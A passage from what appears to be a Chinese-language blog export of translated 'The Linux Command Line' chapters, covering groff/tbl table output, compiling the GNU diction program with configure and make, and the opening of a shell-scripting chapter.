7.04 2007-04-19 |</span><br><span class="line"> |Ubuntu 7.10 2007-10-18 |</span><br><span class="line"> |Ubuntu 8.04 2008-04-24 |</span><br><span class="line"> |Ubuntu 8.10 2008-10-30 |</span><br><span class="line"> +------------------------------+</span><br></pre></td></tr></table></figure>

<p>添加-t选项到groff指示它使用tbl预处理文本流。同样，-T选项用于输出到ASCII而不是默认的输出介质，PostScript。</p>
<p>如果我们指定PostScript输出并以图形方式查看输出，我们将得到一个更令人满意的结果，如图6所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> -k 1,1 -k 2n distros.txt | sed -f distros-tbl.sed | groff -t &gt; ~/Desktop/foo.ps</span><br></pre></td></tr></table></figure>

<p><img src="/images/2024/Picture6.png"></p>
<p><em>图6：查看完成的表格</em></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>鉴于文本是Unix-like操作系统的核心特征，理所当然地会有许多用于操作和格式化文本的工具。正如我们所见，确实有！像fmt和pr这样的简单格式化工具将在产生短文档的脚本中找到许多用途，而groff（及其朋友们）可以用来写书。我们可能永远不会使用命令行工具写技术论文（尽管有很多人这么做！），但知道我们可以这样做是好的。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>groff用户指南</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2dyb2ZmL21hbnVhbC8=">http://www.gnu.org/software/groff/manual/<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>使用-me写论文</em>: <span class="exturl" data-url="aHR0cDovL2RvY3MuZnJlZWJzZC5vcmcvNDRkb2MvdXNkLzE5Lm1lbWFjcm9zL3BhcGVyLnBkZg==">http://docs.freebsd.org/44doc/usd/19.memacros/paper.pdf<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>-me参考手册</em>: <span class="exturl" data-url="aHR0cDovL2RvY3MuZnJlZWJzZC5vcmcvNDRkb2MvdXNkLzIwLm1lcmVmL3BhcGVyLnBkZg==">http://docs.freebsd.org/44doc/usd/20.meref/paper.pdf<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>Tbl – 一个格式化表格的程序</em>: <span class="exturl" data-url="aHR0cDovL3BsYW45LmJlbGwtbGFicy5jb20vMTB0aEVkTWFuL3RibC5wZGY=">http://plan9.bell-labs.com/10thEdMan/tbl.pdf<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>当然，还可以尝试以下维基百科文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9UZVg=">http://en.wikipedia.org/wiki/TeX<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Eb25hbGRfS251dGg=">http://en.wikipedia.org/wiki/Donald_Knuth<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9UeXBlc2V0dGluZw==">http://en.wikipedia.org/wiki/Typesetting<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>编译程序</title>
    <url>/2024/04/23-compiling-programs/</url>
    <content><![CDATA[<h2 id="23-–-编译程序"><a href="#23-–-编译程序" class="headerlink" title="23 – 编译程序"></a>23 – 编译程序</h2><p>在本章中，我们将探讨如何通过编译源代码来构建程序。源代码的可用性是使得Linux成为可能的基本自由。整个Linux开发生态系统依赖于开发者之间的自由交换。对许多桌面用户而言，编译是一种失传的艺术。它曾经相当普遍，但今天，发行版提供者维护着庞大的预编译二进制文件库，随时可以下载和使用。在本文写作之时，Debian仓库（各个发行版中最大的一个）包含超过68,000个包。</p>
<p>那么，为什么要编译软件呢？有两个原因：</p>
<span id="more"></span>

<ol>
<li><strong>可用性</strong>。尽管发行版仓库中有许多预编译程序，但某些发行版可能不包含所有期望的应用程序。在这种情况下，获取所需程序的唯一方式是从源代码编译。</li>
<li><strong>及时性</strong>。虽然一些发行版专注于程序的最新版本，但许多发行版不是。这意味着要拥有程序的最新版本，编译是必要的。</li>
</ol>
<p>从源代码编译软件可能会变得相当复杂和技术性，并且超出了许多用户的能力范围。然而，许多编译任务很简单，只涉及几个步骤。这完全取决于包。我们将查看一个简单的案例，为那些想要进行进一步学习的人提供一个概览和起点。</p>
<p>我们将介绍一个新命令：</p>
<ul>
<li>make – 维护程序的工具</li>
</ul>
<p><strong>什么是编译？</strong></p>
<p>简单地说，编译是将<em>源代码</em>（程序员编写的、用于人类阅读的程序描述）翻译成计算机处理器的原生语言的过程。</p>
<p>计算机的处理器（或<em>CPU</em>）在基本级别上工作，以所谓的<em>机器语言</em>执行程序。这是一个数字代码，描述极其小的操作，例如“添加这个字节”、“指向内存中的这个位置”或“复制这个字节”。每条指令都用二进制（一和零）表示。最早的计算机程序是使用这种数字代码编写的，这或许可以解释为什么编写它的程序员据说要抽很多烟、喝大量的咖啡，并戴厚厚的眼镜。</p>
<p><em>汇编语言</em>的出现克服了这个问题，它用（稍微）更容易使用的字符<em>助记符</em>替代了数字代码，如CPY（用于复制）和MOV（用于移动）。用汇编语言编写的程序通过一个称为<em>汇编器</em>的程序处理成机器语言。汇编语言今天仍用于某些特殊的编程任务，如<em>设备驱动程序</em>和<em>嵌入式系统</em>。</p>
<p>接下来我们遇到所谓的<em>高级编程语言</em>。之所以这样称呼，是因为它们允许程序员更少地关注处理器正在做什么的细节，更多地关注解决手头的问题。早期的一些（在1950年代开发）包括<em>FORTRAN</em>（为科学和技术任务设计）和<em>COBOL</em>（为商业应用设计）。它们今天仍然有限制地使用。</p>
<p>虽然有许多流行的编程语言，但有两种占主导地位。为现代系统编写的大多数程序要么用<em>C</em>编写，要么用<em>C++</em></p>
<p>编写。在接下来的例子中，我们将编译一个C程序。</p>
<p>用高级编程语言编写的程序通过另一个称为<em>编译器</em>的程序转换成机器语言。有些编译器将高级指令翻译成汇编语言，然后使用汇编器执行最后阶段的翻译成机器语言。</p>
<p>一个经常与编译一起使用的过程称为<em>链接</em>。许多程序执行的常见任务。例如，打开一个文件。许多程序执行这个任务，但让每个程序实现自己的打开文件例程将是浪费。更有意义的是拥有一个懂得如何打开文件的单一编程片段，并允许所有需要它的程序共享它。通过所谓的<em>库</em>提供对常见任务的支持。它们包含多个<em>例程</em>，每个例程执行一些多个程序可以共享的常见任务。如果我们查看&#x2F;lib和&#x2F;usr&#x2F;lib目录，我们可以看到许多库所在的位置。一个称为<em>链接器</em>的程序用于形成编译器输出和编译程序所需的库之间的连接。这个过程的最终结果是<em>可执行程序文件</em>，准备使用。</p>
<p><strong>所有程序都是编译的吗？</strong></p>
<p>不是。正如我们所见，有些程序，如shell脚本，不需要编译。它们直接执行。这些是用所谓的<em>脚本</em>或<em>解释型</em>语言编写的。这些语言近年来在流行度上有所增长，包括<em>Perl、Python、PHP、Ruby</em>等许多其他语言。</p>
<p>解释型语言由一种特殊的程序称为<em>解释器</em>执行。解释器输入程序文件，并读取并执行其中包含的每条指令。一般而言，解释型程序的执行速度比编译型程序慢得多。这是因为解释型程序中的每条源代码指令都在执行时进行翻译，而在编译型程序中，源代码指令只翻译一次，这种翻译永久记录在最终的可执行文件中。</p>
<p>为什么解释型语言如此受欢迎？对许多编程任务来说，结果是“足够快的”，但真正的优势是，开发解释型程序通常比开发编译型程序更快、更容易。程序通常在编码、编译、测试的循环中开发。随着程序规模的增长，循环中的编译阶段可能变得相当长。解释型语言去除了编译步骤，因此加速了程序开发。</p>
<h3 id="编译C程序"><a href="#编译C程序" class="headerlink" title="编译C程序"></a>编译C程序</h3><p>让我们来编译一些东西。然而，在此之前，我们需要一些工具，如编译器、链接器和make。在Linux环境中几乎普遍使用的C编译器称为gcc（GNU C Compiler），最初由Richard Stallman编写。大多数发行版默认不安装gcc。我们可以这样检查编译器是否存在：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">which</span> gcc</span><br><span class="line">/usr/bin/gcc</span><br></pre></td></tr></table></figure>

<p>这个例子中的结果表明编译器已经安装。</p>
<p><strong>提示</strong>：你的发行版可能有一个元包（一系列包的集合）用于软件开发。如果是的话，如果你打算在你的系统上编译程序，考虑安装它。如果你的系统没有提供元包，尝试安装gcc和make包。在许多发行版上，这就足以进行以下练习。</p>
<h4 id="获取源代码"><a href="#获取源代码" class="headerlink" title="获取源代码"></a>获取源代码</h4><p>对于我们的编译练习，我们将编译一个来自GNU项目的程序，称为diction。这个小巧的程序用于检查文本文件的写作质量和风格。作为程序而言，它相当小且易于构建。</p>
<p>按照惯例，我们首先为我们的源代码创建一个名为src的目录，然后使用ftp将源代码下载到其中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> src</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> src</span><br><span class="line">[me@linuxbox src]$ ftp ftp.gnu.org</span><br><span class="line">连接到 ftp.gnu.org。</span><br><span class="line">220 GNU FTP服务器就绪。</span><br><span class="line">名称 (ftp.gnu.org:me): 匿名</span><br><span class="line">230 登录成功。</span><br><span class="line">远程系统类型是UNIX。</span><br><span class="line">使用二进制模式传输文件。</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> gnu/diction</span><br><span class="line">250 目录成功更改。</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT命令成功。考虑使用PASV。</span><br><span class="line">150 这里是目录列表。</span><br><span class="line">-rw-r--r-- 1 1003 65534 68940 1998年8月28日 diction-0.7.tar.gz</span><br><span class="line">-rw-r--r-- 1 1003 65534 90957 2002年3月4日 diction-1.02.tar.gz</span><br><span class="line">-rw-r--r-- 1 1003 65534 141062 2007年9月17日 diction-1.11.tar.gz</span><br><span class="line">226 目录发送OK。</span><br><span class="line">ftp&gt; get diction-1.11.tar.gz</span><br><span class="line">本地: diction-1.11.tar.gz 远程: diction-1.11.tar.gz</span><br><span class="line">200 PORT命令成功。考虑使用PASV。</span><br><span class="line">150 为diction-1.11.tar.gz打开BINARY模式数据连接</span><br><span class="line">(141062字节)。</span><br><span class="line">226 文件发送OK。</span><br><span class="line">接收到141062字节，在0.16秒内 (847.4 kB/s)</span><br><span class="line">ftp&gt; <span class="built_in">bye</span></span><br><span class="line">221 再见。</span><br><span class="line">[me@linuxbox src]$ <span class="built_in">ls</span></span><br><span class="line">diction-1.11.tar.gz</span><br></pre></td></tr></table></figure>

<p>虽然我们在前一个示例中使用了ftp，这是传统方式，但还有其他下载源代码的方法。例如，GNU项目还支持使用HTTPS下载。我们可以使用wget程序下载diction源代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ wget https://ftp.gnu.org/gnu/diction/diction1.11.tar.gz</span><br><span class="line">--2018-07-25 09:42:20-- https://ftp.gnu.org/gnu/diction/diction1.11.tar.gz</span><br><span class="line">正在解析主机 ftp.gnu.org (ftp.gnu.org)... 208.118.235.20,</span><br><span class="line">2001:4830:134:3::b</span><br><span class="line">正在连接 ftp.gnu.org (ftp.gnu.org)|208.118.235.20|:443... 已连接。</span><br><span class="line">已发送HTTP请求，正在等待回应... 200 OK</span><br><span class="line">长度：141062 (138K) [application/x-gzip]</span><br><span class="line">正在保存至：“diction-1.11.tar.gz”</span><br><span class="line">diction-1.11.tar.gz 100%[===================&gt;] 137.76K --.-KB/s</span><br><span class="line">用时 0.09s</span><br><span class="line">2018-07-25 09:42:20 (1.43 MB/s) - “diction-1.11.tar.gz.1” 已保存 [141062/141062]</span><br></pre></td></tr></table></figure>

<p>**注意：**由于我们是这段源代码的“维护者”，在我们编译它时，我们将保留它在~&#x2F;src中。由你的发行版安装的源代码将安装在&#x2F;usr&#x2F;src中，而我们维护的、意图供多个用户使用的源代码通常安装在&#x2F;usr&#x2F;local&#x2F;src中。</p>
<p>如我们所见，源代码通常以压缩tar文件的形式提供。有时称为<em>tarball</em>，这个文件包含<em>源代码树</em>，或组成源代码的目录和文件的层次结构。到达ftp站点后，我们检查可用的tar文件列表，并选择最新版本下载。使用ftp内的get命令，我们将文件从ftp服务器复制到本地机器。</p>
<p>一旦tar文件下载完毕，必须解压它。这是用tar程序完成的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox src]$ tar xzf diction-1.11.tar.gz</span><br><span class="line">[me@linuxbox src]$ <span class="built_in">ls</span></span><br><span class="line">diction-1.11 diction-1.11.tar.gz</span><br></pre></td></tr></table></figure>

<p>**提示：**diction程序，像所有GNU项目软件一样，遵循某些源代码打包标准。Linux生态系统中可用的大多数其他源代码也遵循这一标准。该标准的一个元素是，当源代码tar文件被解包时，将创建一个包含源代码树的目录，这个目录将被命名为<em>project-x.xx</em>，因此包含了项目的名称和版本号。这种方案允许轻松安装同一程序的多个版本。然而，在解包之前检查树的布局通常是个好主意。有些项目不会创建目录，而是直接将文件交付到当前目录。这将在我们原本井井有条的src目录中造成混乱。为避免这种情况，请使用以下命令来检查tar文件的内容：</p>
<blockquote>
<p>tar tzvf <em>tarfile</em> | head</p>
</blockquote>
<h4 id="检查源代码树"><a href="#检查源代码树" class="headerlink" title="检查源代码树"></a>检查源代码树</h4><p>解压tar文件会创建一个新的目录，名为diction-1.11。这个目录包含源代码树。让我们看看里面。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox src]$ <span class="built_in">cd</span> diction-1.11</span><br><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">ls</span></span><br><span class="line">config.guess diction.c getopt.c <span class="built_in">nl</span></span><br><span class="line">config.h.in diction.pot getopt.h nl.po</span><br><span class="line">config.sub diction.spec getopt_int.h README</span><br><span class="line">configure diction.spec.in INSTALL sentence.c</span><br><span class="line">configure.in diction.texi.in install-sh sentence.h</span><br><span class="line">COPYING en Makefile.<span class="keyword">in</span> style.1.in</span><br><span class="line">de en_GB misc.c style.c</span><br><span class="line">de.po en_GB.po misc.h <span class="built_in">test</span></span><br><span class="line">diction.1.in getopt1.c NEWS</span><br></pre></td></tr></table></figure>

<p>在其中，我们看到了许多文件。属于GNU项目的程序，以及许多其他程序，会提供README、INSTALL、NEWS和COPYING这些文档文件。这些文件包含了程序的描述、如何构建和安装它的信息，以及它的许可条款。在尝试构建程序之前仔细阅读README和INSTALL文件总是一个好主意。</p>
<p>这个目录中其他有趣的文件是那些以.c和.h结尾的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">ls</span> *.c</span><br><span class="line">diction.c getopt1.c getopt.c misc.c sentence.c style.c</span><br><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">ls</span> *.h</span><br><span class="line">getopt.h getopt_int.h misc.h sentence.h</span><br></pre></td></tr></table></figure>

<p>.c文件包含了软件包提供的两个C程序（style和diction），分为模块。大型程序被拆分为更小、更易于管理的部分是常见做法。源代码文件是普通文本，可以用less查看。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ less diction.c</span><br></pre></td></tr></table></figure>

<p>.h文件被称为<em>头文件</em>。这些也是普通文本。头文件包含了源代码文件或库中包含的例程的描述。为了让编译器连接模块，它必须接收到完成整个程序所需的所有模块的描述。在diction.c文件的开头附近，我们看到这样一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &quot;getopt.h&quot;</span></span><br></pre></td></tr></table></figure>

<p>这指示编译器在读取diction.c中的源代码时阅读getopt.h文件，以“知道”getopt.c中有什么。getopt.c文件提供了style和diction程序共享的例程。</p>
<p>在getopt.h的include语句之前，我们看到一些其他的include语句，比如这些：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;regex.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br></pre></td></tr></table></figure>

<p>这些也是指向头文件，但它们指向的是当前源代码树之外的头文件。它们由系统提供，以支持每个程序的编译。如果我们查看&#x2F;usr&#x2F;include，我们可以看到它们。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">ls</span> /usr/include</span><br></pre></td></tr></table></figure>

<p>这个目录中的头文件是在我们安装编译器时安装的。</p>
<h4 id="构建程序"><a href="#构建程序" class="headerlink" title="构建程序"></a>构建程序</h4><p>大多数程序都可以通过一个简单的两个命令序列构建。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>configure程序是一个随源代码树提供的shell脚本。它的工作是分析<em>构建环境</em>。大多数源代码都设计为<em>可移植的</em>。也就是说，它设计为在多种类型的类Unix系统上构建。但为了做到这一点，源代码在构建过程中可能需要进行轻微的调整，以适应系统之间的差异。configure还会检查是否安装了必要的外部工具和组件。让我们运行configure。由于configure不位于shell通常期望程序位于的位置，我们必须通过在命令前加上.&#x2F;来明确告诉shell它的位置，以指示程序位于当前工作目录中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ ./configure</span><br></pre></td></tr></table></figure>

<p>configure在测试和配置构建时会输出许多消息。当它完成时，它会看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">checking libintl.h presence... <span class="built_in">yes</span></span><br><span class="line">checking <span class="keyword">for</span> libintl.h... <span class="built_in">yes</span></span><br><span class="line">checking <span class="keyword">for</span> library containing gettext... none required</span><br><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating Makefile</span><br><span class="line">config.status: creating diction.1</span><br><span class="line">config.status: creating diction.texi</span><br><span class="line">config.status: creating diction.spec</span><br><span class="line">config.status: creating style.1</span><br><span class="line">config.status: creating <span class="built_in">test</span>/rundiction</span><br><span class="line">config.status: creating config.h</span><br><span class="line">[me@linuxbox diction-1.11]$ </span><br></pre></td></tr></table></figure>

<p>重要的是这里没有错误消息。如果有错误消息，配置失败了，程序将无法构建，直到错误被纠正。</p>
<p>我们看到configure在我们的源目录中创建了几个新文件。最重要的一个是<em>makefile</em>。makefile是一个配置文件，指示make程序如何准确地构建程序。没有它，make将拒绝运行。makefile是一个普通文本文件，所以我们可以查看它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ less Makefile</span><br></pre></td></tr></table></figure>

<p>make程序以<em>makefile</em>（通常命名为Makefile）为输入，该文件描述了构成完成程序的组件之间的关系和依赖性。</p>
<p>makefile的第一部分定义了变量，这些变量在makefile的后续部分被替换。例如我们看到以下行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CC= gcc</span><br></pre></td></tr></table></figure>

<p>那定义了C编译器为gcc。后面在makefile中，我们看到一个使用它的实例。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diction: diction.o sentence.o misc.o getopt.o getopt1.o</span><br><span class="line"> $(CC) -o <span class="variable">$@</span> $(LDFLAGS) diction.o sentence.o misc.o \</span><br><span class="line"> getopt.o getopt1.o $(LIBS)</span><br></pre></td></tr></table></figure>

<p>这里进行了替换，运行时$(CC)的值被替换为gcc。</p>
<p>makefile的大部分由定义<em>目标</em>的行组成，在这个例子中是可执行文件diction和它所依赖的文件。其余的行描述了从其组件创建目标所需的命令。在这个例子中，我们看到可执行文件diction（其中一个最终产品）依赖于diction.o、sentence.o、misc.o、getopt.o和getopt1.o的存在。后来，在makefile中，我们看到每个目标的定义。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diction.o: diction.c config.h getopt.h misc.h sentence.h</span><br><span class="line">getopt.o: getopt.c getopt.h getopt_int.h</span><br><span class="line">getopt1.o: getopt1.c getopt.h getopt_int.h</span><br><span class="line">misc.o: misc.c config.h misc.h</span><br><span class="line">sentence.o: sentence.c config.h misc.h sentence.h</span><br><span class="line">style.o: style.c config.h getopt.h misc.h sentence.h</span><br></pre></td></tr></table></figure>

<p>然而，我们没有看到为它们指定的任何命令。这是由文件中较早的一个通用目标处理的，该目标描述了将任何.c文件编译成.o文件所使用的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.c.o:</span><br><span class="line"> $(CC) -c $(CPPFLAGS) $(CFLAGS) $&lt;</span><br></pre></td></tr></table></figure>

<p>这一切看起来非常复杂。为什么不简单地列出所有编译部分的步骤呢？答案很快就会清楚。与此同时，让我们运行make并构建我们的程序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ make</span><br></pre></td></tr></table></figure>

<p>make程序将运行，使用Makefile的内容指导其操作。它会产生很多消息。</p>
<p>当它完成时，我们会看到所有的目标现在都出现在我们的目录中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">ls</span></span><br><span class="line">config.guess de.po en install-sh sentence.c</span><br><span class="line">config.h diction en_GB Makefile sentence.h</span><br><span class="line">config.h.in diction.1 en_GB.mo Makefile.<span class="keyword">in</span> sentence.o</span><br><span class="line">config.log diction.1.in en_GB.po misc.c style</span><br><span class="line">config.status diction.c getopt1.c misc.h style.1</span><br><span class="line">config.sub diction.o getopt1.o misc.o style.1.in</span><br><span class="line">configure diction.p</span><br><span class="line"></span><br><span class="line">ot getopt.c NEWS style.c</span><br><span class="line">configure.in diction.spec getopt.h <span class="built_in">nl</span> style.o</span><br><span class="line">COPYING diction.spec.in getopt_int.h nl.mo <span class="built_in">test</span></span><br><span class="line">de diction.texi getopt.o nl.po</span><br><span class="line">de.mo diction.texi.in INSTALL README</span><br></pre></td></tr></table></figure>

<p>在文件中，我们看到diction和style，我们开始构建的程序。恭喜你！我们刚刚从源代码编译了我们的第一个程序！</p>
<p>但是，出于好奇，让我们再次运行make。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ make</span><br><span class="line">make: Nothing to be <span class="keyword">done</span> <span class="keyword">for</span> `all<span class="string">&#x27;.</span></span><br></pre></td></tr></table></figure>

<p>它只产生了这个奇怪的消息。发生了什么？为什么它没有再次构建程序？啊，这就是make的魔力。make不是简单地再次构建一切，而是只构建需要构建的东西。由于所有的目标都存在，make确定没有什么可做的。我们可以通过删除一个目标，然后再次运行make来看看它会做什么。让我们删除一个中间目标。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">rm</span> getopt.o</span><br><span class="line">[me@linuxbox diction-1.11]$ make</span><br></pre></td></tr></table></figure>

<p>我们看到make重新构建了它，并重新链接了diction和style程序，因为它们依赖于丢失的模块。这种行为也指出了make的另一个重要特性：它保持目标最新。make坚持目标比它们的依赖更新。这是非常有意义的，因为程序员经常会更新一些源代码，然后使用make构建完成产品的新版本。make确保基于更新的代码需要构建的一切都被构建了。如果我们使用touch程序“更新”其中一个源代码文件，我们可以看到这种情况发生：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">ls</span> -l diction getopt.c</span><br><span class="line">-rwxr-xr-x 1 me me 37164 2009-03-05 06:14 diction</span><br><span class="line">-rw-r--r-- 1 me me 33125 2007-03-30 17:45 getopt.c</span><br><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">touch</span> getopt.c</span><br><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">ls</span> -l diction getopt.c</span><br><span class="line">-rwxr-xr-x 1 me me 37164 2009-03-05 06:14 diction</span><br><span class="line">-rw-r--r-- 1 me me 33125 2009-03-05 06:23 getopt.c</span><br><span class="line">[me@linuxbox diction-1.11]$ make</span><br></pre></td></tr></table></figure>

<p>在make运行后，我们看到它已经将目标恢复为比依赖更新：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">ls</span> -l diction getopt.c</span><br><span class="line">-rwxr-xr-x 1 me me 37164 2009-03-05 06:24 diction</span><br><span class="line">-rw-r--r-- 1 me me 33125 2009-03-05 06:23 getopt.c</span><br></pre></td></tr></table></figure>

<p>make能够智能地只构建需要构建的内容，对程序员来说是一个巨大的好处。虽然我们的小项目可能看不出时间节省，但在更大的项目上这非常重要。记住，Linux内核（一个不断修改和改进的程序）包含了几百万行代码。</p>
<h4 id="安装程序"><a href="#安装程序" class="headerlink" title="安装程序"></a>安装程序</h4><p>良好打包的源代码通常会包括一个特殊的make目标，称为install。这个目标将把最终产品安装在系统目录中供使用。通常，这个目录是&#x2F;usr&#x2F;local&#x2F;bin，这是本地构建软件的传统位置。然而，这个目录通常不允许普通用户写入，所以我们必须成为超级用户才能执行安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ sudo make install</span><br></pre></td></tr></table></figure>

<p>执行安装后，我们可以检查程序是否准备就绪。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox diction-1.11]$ <span class="built_in">which</span> diction</span><br><span class="line">/usr/local/bin/diction</span><br><span class="line">[me@linuxbox diction-1.11]$ man diction</span><br></pre></td></tr></table></figure>

<p>我们完成了！</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在本章中，我们看到了如何使用三个简单的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure make make install</span><br></pre></td></tr></table></figure>

<p>来构建许多源代码包。我们还看到了make在程序维护中扮演的重要角色。make程序可以用于需要维护目标&#x2F;依赖关系的任何任务，不仅仅是编译源代码。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>维基百科上有关于编译器和make程序的好文章：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Db21waWxlcg==">http://en.wikipedia.org/wiki/Compiler<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NYWtlXyhzb2Z0d2FyZSk=">http://en.wikipedia.org/wiki/Make_(software)<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>GNU Make手册</em>：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL21ha2UvbWFudWFsL2h0bWxfbm9kZS9pbmRleC5odG1s">http://www.gnu.org/software/make/manual/html_node/index.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>编写你的第一个脚本</title>
    <url>/2024/04/24-writing-your-first-script/</url>
    <content><![CDATA[<h1 id="第4部分-编写Shell脚本"><a href="#第4部分-编写Shell脚本" class="headerlink" title="第4部分 - 编写Shell脚本"></a>第4部分 - 编写Shell脚本</h1><h2 id="24-编写你的第一个脚本"><a href="#24-编写你的第一个脚本" class="headerlink" title="24 - 编写你的第一个脚本"></a>24 - 编写你的第一个脚本</h2><p>在前面的章节中，我们已经集合了一系列命令行工具。虽然这些工具可以解决许多种类的计算问题，但我们仍然局限于在命令行上一次一个地手动使用它们。如果我们能让shell做更多的工作不是很好吗？我们可以做到。通过将我们的工具组合成我们自己设计的程序，shell可以自己完成复杂的任务序列。我们可以通过编写<em>shell脚本</em>来使它做到这一点。</p>
<p><strong>什么是Shell脚本？</strong></p>
<span id="more"></span>

<p>简单来说，shell脚本是一个包含一系列命令的文件。shell读取这个文件并执行命令，就好像它们已经直接在命令行上输入一样。</p>
<p>shell在某种意义上是独一无二的，因为它既是系统的强大命令行界面，也是脚本语言解释器。我们将看到，大多数在命令行上可以做的事情都可以在脚本中完成，而大多数在脚本中可以做的事情都可以在命令行上完成。</p>
<p>我们已经介绍了许多shell特性，但我们关注的是那些最常在命令行上直接使用的特性。shell还提供了一组通常（但不总是）在编写程序时使用的特性。</p>
<h3 id="如何编写一个Shell脚本"><a href="#如何编写一个Shell脚本" class="headerlink" title="如何编写一个Shell脚本"></a>如何编写一个Shell脚本</h3><p>要成功创建和运行一个shell脚本，我们需要做三件事。</p>
<ol>
<li><p><strong>编写脚本。</strong> Shell脚本是普通文本文件。所以，我们需要一个文本编辑器来编写它们。最好的文本编辑器将提供<em>语法高亮</em>，让我们能够看到脚本元素的颜色编码视图。语法高亮将帮助我们发现某些类型的常见错误。vim, gedit, kate和许多其他编辑器都是编写脚本的好候选。</p>
</li>
<li><p><strong>使脚本可执行。</strong> 系统对于不允许任何旧文本文件被当作程序处理非常挑剔，这是有充分理由的！我们需要设置脚本文件的权限以允许执行。</p>
</li>
<li><p><strong>将脚本放在shell可以找到的地方。</strong> 当没有指定显式路径名时，shell会自动搜索某些目录中的可执行文件。为了最大的便利，我们将把我们的脚本放在这些目录中。</p>
</li>
</ol>
<h3 id="脚本文件格式"><a href="#脚本文件格式" class="headerlink" title="脚本文件格式"></a>脚本文件格式</h3><p>遵循编程传统，我们将创建一个“Hello World”程序来演示一个极其简单的脚本。让我们启动文本编辑器并输入以下脚本：</p>
